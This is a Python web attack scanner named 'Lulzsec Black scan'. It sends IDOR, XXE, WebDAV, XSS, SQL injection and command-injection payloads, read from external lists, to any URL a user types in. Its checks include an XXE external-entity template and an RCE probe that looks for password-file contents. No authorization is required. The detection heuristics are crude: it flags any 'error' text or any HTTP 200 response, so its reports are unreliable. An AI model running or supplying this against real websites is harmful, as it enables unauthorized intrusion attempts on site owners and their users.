import requests
from bs4 import BeautifulSoup
import pyfiglet  # Import the pyfiglet library

def display_banner():
    banner_text = pyfiglet.figlet_format("Lulzsec Black scan")
    print(banner_text)

def read_paths_from_txt(txt_file):
    with open(txt_file, 'r') as file:
        paths = file.readlines()
    # Remove whitespace characters like `\n` at the end of each line
    paths = [path.strip() for path in paths if path.strip()]
    return paths

def scan(url):
    print("Scan started for:", url)

    # IDOR Vulnerability Check
    idor_paths = read_paths_from_txt('idor.txt')
    for path in idor_paths:
        vulnerable_param_idor = {'id': path}
        response_idor = requests.get(url, params=vulnerable_param_idor)
        if response_idor.status_code == 200:
            print(f"Potential IDOR vulnerability detected with path: {path}")

    # XXE Vulnerability Check
    xxe_paths = read_paths_from_txt('xxe.txt')
    for path in xxe_paths:
        vulnerable_xml_data = f'''
        <!DOCTYPE replace [
        <!ENTITY xxe SYSTEM "{path}">
        ]>
        <root>&xxe;</root>
        '''
        headers_xml = {'Content-Type': 'application/xml'}
        response_xxe = requests.post(url, data=vulnerable_xml_data, headers=headers_xml)
        soup = BeautifulSoup(response_xxe.content, 'html.parser')
        if 'root' in soup.text:
            print(f"Potential XXE vulnerability detected with path: {path}")

    # WebDAV Vulnerability Check
    webdav_paths = read_paths_from_txt('webdav.txt')
    for path in webdav_paths:
        response_webdav = requests.request('PROPFIND', f"{url}/{path}")
        if response_webdav.status_code == 207 and 'D:multistatus' in response_webdav.text:
            print(f"Potential WebDAV vulnerability detected with path: {path}")

    # XSS Vulnerability Check
    xss_paths = read_paths_from_txt('xss.txt')
    for path in xss_paths:
        vulnerable_param_xss = {'input': path}
        response_xss = requests.get(url, params=vulnerable_param_xss)
        if path in response_xss.text:
            print(f"Potential XSS vulnerability detected with path: {path}")

    # SQL Injection Vulnerability Check
    sql_paths = read_paths_from_txt('sql_injection.txt')
    for path in sql_paths:
        vulnerable_param_sql = {'id': path}
        response_sql = requests.get(url, params=vulnerable_param_sql)
        if 'error' in response_sql.text:
            print(f"Potential SQL Injection vulnerability detected with path: {path}")

    # RCE Vulnerability Check
    rce_paths = read_paths_from_txt('rce.txt')
    for path in rce_paths:
        vulnerable_param_rce = {'cmd': path}
        response_rce = requests.get(url, params=vulnerable_param_rce)
        if 'root:' in response_rce.text:
            print(f"Potential RCE vulnerability detected with path: {path}")

# Example usage
if __name__ == '__main__':
    display_banner()  # Display the banner
    website_url = input("Enter website URL to scan: ")
    scan(website_url)
